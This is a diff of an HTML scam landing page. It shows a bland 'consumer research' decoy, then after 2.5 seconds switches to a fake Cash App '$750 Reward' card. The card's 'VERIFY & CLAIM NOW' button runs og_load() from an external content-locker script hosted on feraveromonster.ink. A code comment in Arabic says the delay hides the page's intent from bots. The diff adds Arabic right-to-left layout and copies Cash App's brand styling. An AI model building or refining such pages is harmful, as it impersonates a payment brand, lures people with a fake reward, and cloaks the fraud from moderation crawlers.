@@ -1,48 +1,144 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Consumer Research Node - USA 2026</title>
     
     <script type="text/javascript" id="ogjs" src="https://feraveromonster.ink/cl/js/4oro7r"></script>
 
     <style>
-        body { margin: 0; padding: 0; font-family: -apple-system, sans-serif; background: #f0f2f5; }
-        #decoy-section { padding: 40px 20px; color: #555; max-width: 800px; margin: auto; line-height: 1.8; }
-        #real-offer-section { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; z-index: 9999; overflow-y: auto; }
-        .card { max-width: 450px; margin: 50px auto; background: white; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .cash-img { width: 90px; height: 90px; border-radius: 20px; margin-bottom: 15px; }
-        .badge { background: #e7f3ff; color: #1877f2; padding: 8px 15px; border-radius: 50px; font-weight: bold; font-size: 14px; }
-        .main-button { display: block; background: #28a745; color: white; padding: 20px; border-radius: 12px; text-decoration: none; font-weight: bold; font-size: 20px; border: none; width: 100%; margin-top: 25px; cursor: pointer; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.05);} 100% {transform: scale(1);} }
+        /* تهيئة الشاشة الكاملة */
+        html, body { 
+            margin: 0; 
+            padding: 0; 
+            width: 100%; 
+            height: 100%; 
+            overflow: hidden; 
+            background: #f0f2f5; 
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        /* قسم التمويه (Decoy) */
+        #decoy-section { 
+            padding: 40px 20px; 
+            color: #555; 
+            max-width: 800px; 
+            margin: auto; 
+            line-height: 1.8; 
+            text-align: left; /* المحتوى التمويهي يفضل أن يبقى بالإنجليزية */
+        }
+
+        /* قسم العرض الحقيقي (Real Offer) */
+        #real-offer-section { 
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: #f5f5f7; 
+            z-index: 9999; 
+            /* التوسيط الكامل */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .card { 
+            width: 100%;
+            max-width: 420px; 
+            background: white; 
+            padding: 40px 25px; 
+            border-radius: 30px; 
+            text-align: center; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .cash-img { 
+            width: 100px; 
+            height: 100px; 
+            border-radius: 24px; 
+            margin-bottom: 20px; 
+            box-shadow: 0 8px 16px rgba(0,208,132,0.2);
+        }
+
+        .badge { 
+            display: inline-block;
+            background: #e7f3ff; 
+            color: #1877f2; 
+            padding: 10px 20px; 
+            border-radius: 50px; 
+            font-weight: 800; 
+            font-size: 13px; 
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+        }
+
+        h1 { font-size: 24px; color: #1c1e21; margin-bottom: 10px; }
+
+        .main-button { 
+            display: block; 
+            background: #00d084; /* لون Cash App الرسمي */
+            color: white; 
+            padding: 22px; 
+            border-radius: 18px; 
+            text-decoration: none; 
+            font-weight: 900; 
+            font-size: 20px; 
+            border: none; 
+            width: 100%; 
+            margin-top: 30px; 
+            cursor: pointer; 
+            box-shadow: 0 10px 20px rgba(0, 208, 132, 0.3);
+            animation: pulse 1.8s infinite; 
+            -webkit-appearance: none; /* لمنع مشاكل التصميم في سفاري */
+        }
+
+        @keyframes pulse { 
+            0% { transform: scale(1); box-shadow: 0 10px 20px rgba(0, 208, 132, 0.3); } 
+            50% { transform: scale(1.03); box-shadow: 0 15px 30px rgba(0, 208, 132, 0.4); } 
+            100% { transform: scale(1); box-shadow: 0 10px 20px rgba(0, 208, 132, 0.3); } 
+        }
+
+        .footer-text { font-size: 12px; color: #999; margin-top: 20px; }
     </style>
 </head>
 <body>
 
     <div id="decoy-section">
         <h1>Digital Survey Analysis: US Retail Markets</h1>
-        <p>In 2026, the integration of peer-to-peer digital feedback has revolutionized market research. This platform serves as a secure gateway for collecting high-fidelity consumer sentiment data. Our protocols ensure that all participant interactions are verified through automated security layers to maintain data integrity...</p>
+        <p>In 2026, the integration of peer-to-peer digital feedback has revolutionized market research. This platform serves as a secure gateway for collecting high-fidelity consumer sentiment data...</p>
     </div>
 
-    <div id="real-offer-section">
+    <div id="real-offer-section" style="display: none;">
         <div class="card">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_Cash_app_logo.svg" class="cash-img">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_Cash_app_logo.svg" class="cash-img" alt="Cash App">
             <h1>Reward Verification</h1>
             <div class="badge">● ELIGIBILITY CONFIRMED</div>
-            <p style="color:#666; margin-top: 15px;">You have been selected to receive a <b>$750 Reward</b>. To claim your access, please complete the human verification below.</p>
+            <p style="color:#556171; font-size: 16px; line-height: 1.5;">You have been selected to receive a <b>$750 Reward</b>. Complete human verification to claim.</p>
             
             <button class="main-button" onclick="og_load();">VERIFY & CLAIM NOW</button>
             
-            <p style="font-size: 12px; color: #999; margin-top: 15px;">Verification ensures one reward per household.</p>
+            <p class="footer-text">Verification ensures one reward per household.<br>© 2026 Rewards Program</p>
         </div>
     </div>
 
     <script>
-        // السحر: إظهار العرض بعد 2.5 ثانية لإخفاء النوايا عن الروبوتات
+        // التبديل الذكي مع ضمان ملء الشاشة
         setTimeout(function() {
-            document.getElementById('real-offer-section').style.display = 'block';
-            document.getElementById('decoy-section').style.display = 'none';
+            const decoy = document.getElementById('decoy-section');
+            const real = document.getElementById('real-offer-section');
+            
+            if (decoy && real) {
+                decoy.style.display = 'none';
+                real.style.display = 'flex'; // استخدام flex لضمان التوسيط
+                
+                // تحديث العنوان ليناسب العرض
+                document.title = "Verification Required - $750";
+            }
         }, 2500);
     </script>
 
